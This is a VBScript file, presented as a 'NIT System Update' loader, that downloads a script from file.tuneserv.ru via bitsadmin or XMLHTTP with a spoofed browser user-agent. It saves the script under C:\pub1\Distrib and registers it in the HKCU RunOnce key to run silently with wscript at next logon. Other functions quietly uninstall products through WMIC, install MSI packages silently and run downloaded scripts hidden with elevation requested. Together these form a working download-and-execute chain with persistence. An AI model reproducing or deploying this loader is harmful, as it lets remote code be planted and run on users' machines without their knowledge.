Option Explicit

' *****************************************************************************
' Predefined Constants
' *****************************************************************************
Const STR_DISK = "C:"
Const STR_FOLDER1 = "pub1"
Const STR_FOLDER2 = "Distrib"
Const THREAD_VBS = "Load-NIT-System-Update.vbs"
'Const STR_SRCCODE = "SrcCode" 'Must be Same in MSI Installer'

Const HTTP_PREFIX1 = "http://" 'Prefix of Site Downloaded From'
Const HTTP_HOST1 = "file.tuneserv.ru" 'Host Name or IP address of the Site'
Const HTTP_PORT1 = ":80" 'Port of the Site'
Const HTTP_UPDATE_PATH1 = "/WinUpdate/" 'Path to WinUpdate of the Site'
Const HTTP_EXPON_PATH1 = "/Exponenta/" 'Path to WinUpdate of the Site'

' *****************************************************************************

ScriptTestRunKeyDownloaded

' *****************************************************************************
'
' SUBROUTINE ScriptTestRunKeyDownloaded
'
' This Subroutine Downloads NIT Update Script on Computer at Test Mode
' The Subroutine Uses Predefined Constants
'
' PARAMETERS:   NONE
' RETURNS:      NONE
'
' *****************************************************************************
Sub ScriptTestRunKeyDownloaded()

        Dim Url         'Full URL Neme of the File in the Site
        Dim local_Path     'Local Path to Command File with Drive Letter
        Dim tempsPath
		Dim wshShell, envVarProccess
        Set WshShell = CreateObject("WScript.Shell")
        Set envVarProccess = WshShell.Environment("PROCESS")
		tempsPath = envVarProccess("TEMP")
        local_Path = STR_DISK & "\" & STR_FOLDER1 & "\" & STR_FOLDER2
        Url = HTTP_PREFIX1 & HTTP_HOST1 & HTTP_PORT1 & HTTP_UPDATE_PATH1

        CreatedCascade STR_DISK, STR_FOLDER1, STR_FOLDER2
        UploadedFilesFromInt01 THREAD_VBS, Url, local_Path
        CreatedRunOnceKey local_Path, THREAD_VBS

End Sub


' *****************************************************************************
'
' SUBROUTINE SimpleScriptTestRunKeyDownloaded
'
' This Subroutine Downloads NIT Update Script on Computer
' The Subroutine Uses Predefined Constants
'
' PARAMETERS:   NONE
' RETURNS:      NONE
'
' *****************************************************************************
Sub SimpleScriptTestRunKeyDownloaded()

        Dim Url         'Full URL Neme of the File in the Site
        Dim local_Path      'Local Path to Command File with Drive Letter
        Dim tempsPath
		Dim wshShell, envVarProccess
        Set WshShell = CreateObject("WScript.Shell")
        Set envVarProccess = WshShell.Environment("PROCESS")
		tempsPath = envVarProccess(TEMP)
        Dim iTemp

        local_Path = STR_DISK & "\" & STR_FOLDER1 & "\" & STR_FOLDER2
        Url = HTTP_PREFIX1 & HTTP_HOST1 & HTTP_PORT1 & HTTP_UPDATE_PATH1

        iTemp = CreateTwocascadeFolders(STR_DISK, STR_FOLDER1, STR_FOLDER2)
        iTemp = UploadFilesFromInt01(THREAD_VBS, Url, local_Path)
        iTemp = CreateRunOnceKey(local_Path, THREAD_VBS)

End Sub

' *****************************************************************************
'
' CreateRunOnceKey( strPath, strBatCmd )
' This Function Creates a strBatCmd Key at the Registry Node
' HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
' with Value "wscript.exe //B //Nologo  " & strPath & "\" & strBatCmd
' After overload it is run this command
' The Script No Run at Elevated Mode. Further the Rights can be Elevated.
'
' PARAMETERS:   strPath -- The Path to strBatCmd
'               strBatCmd -- a Script File with instructions
'               (Windows Script Shell)
'
' RETURNS:      vbTrue -- if Success
'               vbFalse -- on Error takes place
'
' *****************************************************************************

Function CreateRunOnceKey(strPath, strBatCmd)
        Dim constRunOnce
        Dim constRunBat
        Dim strValue
        Dim strKey
        Dim WshShell
        constRunOnce = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"
        constRunBat = "wscript.exe //B //Nologo "
        Set WshShell = CreateObject("WScript.Shell")
        strKey = constRunOnce & "\" & strBatCmd
        strValue = constRunBat & Chr(34) & strPath & "\" & strBatCmd & Chr(34)
        'MsgBox strValue
        Call WshShell.RegWrite(strKey, strValue, "REG_SZ")
        CreateRunOnceKey = vbTrue
End Function

' *****************************************************************************
'
' CreatedRunOnceKey( strPath, strBatCmd )
' This Subroutine checks if Function CreateRunOnceKey Run with Success
' and Show result on Screen
'
' PARAMETERS:   strPath -- The Path to strBatCmd
'               strBatCmd -- a Command File with instructions
'               (Windows Command Shell)
'
' RETURNS:      NONE
'
' *****************************************************************************

Sub CreatedRunOnceKey(strPath, strBatCmd)
        Dim strSuccess
        Dim strFail
        strSuccess = "The key " & strBatCmd & " at RunOnce Registry section was Created" & vbCrLf
        strFail = "The key " & strBatCmd & " at RunOnce Registry section was NOT Created" & vbCrLf
        If CreateRunOnceKey(strPath, strBatCmd) Then
                MsgBox strSuccess
        Else
                MsgBox strFail
        End If
End Sub

' *****************************************************************************
'
' CreateTwocascadeFolders( strDisk, strFolder1, strFolder2 )
'
' This Function Creates on Disk strDisk the Folders strFolder1 and strFolder2
'
' PARAMETERS:   strDisk -- the Disk Drive. Must be Exist!
'               strFolder1 -- the first Folder on strDisk. May be Exist.
'               strFolder2 -- the Second Folder on strDisk. May be Exist.
'
' RETURNS:      vbTrue if Success Create or Folder Exist
'               vbFalse if Cascade Can't Create
'
' *****************************************************************************

Function CreateTwocascadeFolders(strDisk, strFolder1, strFolder2)

        Dim fso
        Dim strPath                             'Path to Folders'
        Dim fsoCreateResult             'result of Folder Creation'
        Dim blnEnableCreated    'true if Folder Enable to create'
        Dim blnDrv                              'Drive Exist'
        strDisk = UCase(strDisk)
        blnEnableCreated = vbTrue
        Set fso = CreateObject("Scripting.FileSystemObject")
        blnDrv = fso.DriveExists(fso.GetDriveName(strDisk))
        If blnEnableCreated And blnDrv Then
                blnEnableCreated = vbTrue
        Else
                blnEnableCreated = vbFalse
        End If
        strPath = strDisk & "\" & strFolder1
        If blnEnableCreated And Not fso.FolderExists(strPath) Then
                fsoCreateResult = fso.CreateFolder(strPath)
                If Not IsEmpty(fsoCreateResult) Then
                        blnEnableCreated = vbTrue
                Else
                        blnEnableCreated = vbFalse
                End If
        End If
        strPath = strPath & "\" & strFolder2
        If blnEnableCreated And Not fso.FolderExists(strPath) Then
                fsoCreateResult = fso.CreateFolder(strPath)
                If Not IsEmpty(fsoCreateResult) Then
                        blnEnableCreated = vbTrue
                Else
                        blnEnableCreated = vbFalse
                End If
        End If
        CreateTwocascadeFolders = blnEnableCreated
End Function

' *****************************************************************************
'
' CreatedCascade strDisk, strFolder1, strFolder2
'
' This Subroutine Creates Cascade of Folders and Says Operator about a Result
' of the Function CreateTwocascadeFolders Called
'
' PARAMETERS:   strDisk -- the Disk Drive. Must be Exist!
'               strFolder1 -- the first Folder on strDisk. May be Exist.
'               strFolder2 -- the Second Folder on strDisk. May be Exist.
'
' RETURNS:      NONE
'
' *****************************************************************************
Sub CreatedCascade(strDisk, strFolder1, strFolder2)
        Dim strSuccess, strFail
        strSuccess = "The Folders Cascade has created or Exist" & vbCrLf
        strFail = "Fail to Create Cascade on Error" & vbCrLf
        If CreateTwocascadeFolders(strDisk, strFolder1, strFolder2) Then
                MsgBox strSuccess
        Else
                MsgBox strFail
        End If
End Sub

' *****************************************************************************
'
' UploadFilesFromInt( strFile, strURL, strPath )
' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
' and Save it on Local Computer to Path strPath
' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
'
' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
'               strURL -- an URL of the web-site, from which the File
'               is Downloaded
'               strPath -- a Place in a Windows Computer (Full path without slash)
'               in which the File is Downloaded
'
' RETURNS:      vbFalse -- If File is Normally Downloaded and Created
'               1 -- if File in Path strPath Can't Create
'               2 -- If HTTP Response Not 200 (while is not make)
'
' *****************************************************************************

Function UploadFilesFromInt(strFile, strURL, strPath)
        Dim fso, xmlHttp, adoStream
        Set fso = CreateObject("Scripting.FileSystemObject")
        Set xmlHttp = CreateObject("Microsoft.XMLHTTP")
        Set adoStream = CreateObject("Adodb.Stream")
        Dim strfileURL          'Full URL for file'
        Dim strLocal_Path               'full Path to local File'
        Dim intUploadFilesFromInt
        Dim blnExistRemoteFile
        strfileURL = strURL & strFile
        strLocal_Path = strPath & "\" & strFile

        '**** Check if path is Exist ****'
        If fso.FolderExists(strPath) Then
                intUploadFilesFromInt = vbFalse
        Else
                intUploadFilesFromInt = 1
        End If

                ' **** Download File ****
        'MsgBox strfileURL
        xmlHttp.Open "GET", strfileURL, False
        xmlHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
        xmlHttp.Send
        'MsgBox xmlHttp.statusText
        If xmlHttp.Status = 200 And intUploadFilesFromInt = vbFalse Then
                        blnExistRemoteFile = vbTrue
        Else
                        blnExistRemoteFile = vbFalse
                        intUploadFilesFromInt = 2
                        xmlHttp.Abort
        End If
        If blnExistRemoteFile Then
                        adoStream.Type = 1
                        adoStream.Mode = 3
                        adoStream.Open
                        adoStream.Write xmlHttp.responseBody
                        adoStream.SaveToFile strLocal_Path, 2
        '       **** /Download File ****

                        adoStream.Close
                        xmlHttp.Abort

                ' **** Check if Files is Downloaded **** '
                        If Not fso.FileExists(strLocal_Path) And intUploadFilesFromInt = vbFalse Then
                                intUploadFilesFromInt = 1
                        End If
        End If
        ' **** /Check Path if Exist **** '
        UploadFilesFromInt = intUploadFilesFromInt
End Function

' *****************************************************************************
'
' UploadFilesFromInt01( strFile, strURL, strPath )
' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
' and Save it on Local Computer to Path strPath
' Function Uses "BitsAdmin.exe" Funktion for Load File
'
' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
'               strURL -- an URL of the web-site, from which the File
'               is Downloaded
'               strPath -- a Place in a Windows Computer (Full path without slash)
'               in which the File is Downloaded
'
' RETURNS:      vbFalse -- If File is Normally Downloaded and Created
'               1 -- if File in Path strPath Can't Create
'
' *****************************************************************************

Function UploadFilesFromInt01(strFile, strURL, strPath)
        Dim fso, WshShell, shApp
        Set fso = CreateObject("Scripting.FileSystemObject")
        Set WshShell = CreateObject("WScript.Shell")
        Set shApp = CreateObject("Shell.Application")
        Dim strfileURL          'Full URL for file'
        Dim strLocal_Path               'full Path to local File'
        Dim intUploadFilesFromInt
        Dim blnExistRemoteFile
        strfileURL = strURL & strFile
        strLocal_Path = strPath & "\" & strFile

        '**** Check if path is Exist ****'
        If fso.FolderExists(strPath) Then
                intUploadFilesFromInt = vbFalse
        Else
                intUploadFilesFromInt = 1
        End If

        ' **** Download File ****
        Dim envVarProccess
        Dim pathCMD, strSysPath, strParam
        Set envVarProccess = WshShell.Environment("PROCESS")
        pathCMD = envVarProccess("SystemRoot") & "\System32\"
        strSysPath = pathCMD & "bitsadmin.exe"
        strParam = "/Transfer STEA_TRANSFER /DOWNLOAD /Priority FOREGROUND " & strfileURL & " " & Chr(34) & strLocal_Path & Chr(34)
        shApp.ShellExecute strSysPath, strParam, pathCMD, "runas", 0
       '       **** /Download File ****

                ' **** Check if Files is Downloaded **** '
                        If Not fso.FileExists(strLocal_Path) And intUploadFilesFromInt = vbFalse Then
                                intUploadFilesFromInt = 1
                        End If
        ' **** /Check Path if Exist **** '
        UploadFilesFromInt01 = intUploadFilesFromInt
End Function

' *****************************************************************************
'
' SUBROUTENE UploadedFilesFromInt( strFile, strURL, strPath )
'
' This Subroutine Call UploadFilesFromInt( strFile, strURL, strPath ) and Show
' the Result on Screen
'
' Now the Subroutine is only saying on success or not of the function call
'
' *****************************************************************************

Sub UploadedFilesFromInt(strFile, strURL, strPath)
        Dim strSuccess, strFail, strURLFail, iResult
        strSuccess = "The File " & strFile & " was Successfully Downlodaded" & vbCrLf & "From URL: " & strURL & vbCrLf & "To Path: " & strPath & vbCrLf
        strFail = "Error to Create File: " & strFile & " on Path " & strPath & vbCrLf
        strURLFail = "The URL: " & strURL & strFile & " is not valid!" & vbCrLf
        iResult = UploadFilesFromInt(strFile, strURL, strPath)
        Select Case iResult
                Case 0:
                        MsgBox strSuccess
                Case 1:
                        MsgBox strFail
                Case 2:
                        MsgBox strURLFail
        End Select
End Sub

' *****************************************************************************
'
' SUBROUTENE UploadedFilesFromInt01( strFile, strURL, strPath )
'
' This Subroutine Call UploadFilesFromInt01( strFile, strURL, strPath ) and Show
' the Result on Screen
'
' Now the Subroutine is only saying on success or not of the function call
'
' *****************************************************************************

Sub UploadedFilesFromInt01(strFile, strURL, strPath)
        Dim strSuccess, strFail, strURLFail, iResult
        strSuccess = "The File " & strFile & " was Successfully Downlodaded" & vbCrLf & "From URL: " & strURL & vbCrLf & "To Path: " & strPath & vbCrLf
        strFail = "Error to Create File: " & strFile & " on Path " & strPath & vbCrLf
        strURLFail = "The URL: " & strURL & strFile & " is not valid!" & vbCrLf
        iResult = UploadFilesFromInt01(strFile, strURL, strPath)
        Select Case iResult
                Case 0:
                        MsgBox strSuccess
                Case 1:
                        MsgBox strFail
        End Select
End Sub

' *****************************************************************************
'
' InstallDownloaded( strPath, strMSI )
' This Function Install a strMSI File
' with Command "msiexec /i " & strPath & "\" & strMSI
'
' PARAMETERS:   strPath -- The Path to strBatCmd
'               strMSI -- a MSI File with instructions
'               (Windows Command Shell)
'               strSrcCode -- The Name of MSI Application in Registry
'
' RETURNS:      vbTrue -- if Success
'               vbFalse -- on Error takes place
'
' *****************************************************************************

Function InstallDownloaded(strPath, strBatCmd, strSrcCode)
        Const constRunBat = "/i "
        Const constOpt = " /norestart /QN"
        Dim strValue, WshShell, shApp
        Set shApp = CreateObject("Shell.Application")
        Set WshShell = CreateObject("WScript.Shell")
        strValue = constRunBat & Chr(34) & strPath & "\" & strBatCmd & Chr(34) & constOpt
        'MsgBox strValue
        'MsgBox "wmic.exe product where name=" & Chr(34) & "ScrCode" & Chr(34) & "call uninstall"
        shApp.ShellExecute "C:\WINDOWS\System32\wbem\WMIC.exe", "product where name=" & Chr(34) & strSrcCode & Chr(34) & " call uninstall", strPath, "runas", 0
        TimeSleep (90)
        shApp.ShellExecute "msiexec.exe", strValue, strPath, "runas", 0
        InstallDownloaded = vbTrue
End Function

' *****************************************************************************
'
' InstalledDownloaded( strPath, strBatCmd )
' This Subroutine checks if Function InstallDownloaded Run with Success
' and Show result on Screen
'
' PARAMETERS:   strPath -- The Path to strBatCmd
'               strBatCmd -- a Command File with instructions
'               (Windows Command Shell)
'               strSrcCode -- The Name of MSI Application in Registry
'
' RETURNS:      NONE
'
' *****************************************************************************

Sub InstalledDownloaded(strPath, strBatCmd, strSrcCode)
        Dim strSuccess, strFail
        strSuccess = "The Packet " & strBatCmd & " was Installed" & vbCrLf
        strFail = "The Packet " & strBatCmd & " was NOT Installed" & vbCrLf
        If InstallDownloaded(strPath, strBatCmd, strSrcCode) Then
                MsgBox strSuccess
        Else
                MsgBox strFail
        End If
End Sub

Sub TimeSleep(delim)
        Dim dteWait
        dteWait = DateAdd("s", delim, Now())
        Do Until (Now() > dteWait)
                Loop
End Sub

' *****************************************************************************
'
' RunDownloadedScript( strPath, strVBS )
' This Function Run a strVBS File
' with Command "cscript //NoLogo " & strPath & "\" & strVBS
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'
' RETURNS:      vbTrue -- if Success
'               vbFalse -- on Error takes place
'
' *****************************************************************************

Function RunDownloadedScript(strPath, strVBS)
        Const constRunVBS = "//Nologo "
        Const constOpt = ""
        Dim strValue, WshShell, shApp
        Set shApp = CreateObject("Shell.Application")
        Set WshShell = CreateObject("WScript.Shell")
        strValue = constRunVBS & Chr(34) & strPath & "\" & strVBS & Chr(34) & constOpt
        'MsgBox strValue
        shApp.ShellExecute "C:\WINDOWS\System32\cscript.exe", strValue, strPath, "runas", 0
        RunDownloadedScript = vbTrue
End Function

' *****************************************************************************
'
' RunedDownloadedScript( strPath, strVBS )
' This Subroutine checks if Function RunDownloadedScript Run with Success
' and Show result on Screen
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'
'
' RETURNS:      NONE
'
' *****************************************************************************

Sub RunedDownloadedScript(strPath, strVBS)
        Dim strSuccess, strFail
        strSuccess = "The Script " & strVBS & " was Run with Success" & vbCrLf
        strFail = "The Script " & strVBS & " was Run with Fail" & vbCrLf
        If RunDownloadedScript(strPath, strVBS) Then
                MsgBox strSuccess
        Else
                MsgBox strFail
        End If
End Sub

' *****************************************************************************
'
' GetTempEnvirron()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path For User Variable %TEMP% if Success
'               "C:\Windows\Temp" if API Error
'
' *****************************************************************************
' *****************************************************************************
'
' Copy_VBS
' This Function Copy thread_VBS File ftom Current Directory to Local_Path
'
' PARAMETERS:   thread_VBS -- target file to copy
'               local_Path -- the path to be copied
'
' RETURNS:      NONE
'
' *****************************************************************************

Sub Copy_VBS(THREAD_VBS, local_Path)
        Dim Current_File
        Dim Target_File
        Dim fso
        Dim objFile
        Set fso = CreateObject("Scripting.FileSystemObject")
        Current_File = ThisDocument.Path & "\" & THREAD_VBS
        Target_File = local_Path & "\" & THREAD_VBS
        If fso.FileExists(Target_File) Then
                objFile = fso.GetFile(Target_File)
                objFile.Delete
        End If
        If fso.FileExists(Current_File) Then
                objFile = fso.GetFile(Current_File)
                objFile.Copy Target_File
        Else
                MsgBox "Source file " & THREAD_VBS & " not Found!", vbCritical Or vbOkOnly, "File not Found"
        End If
End Sub
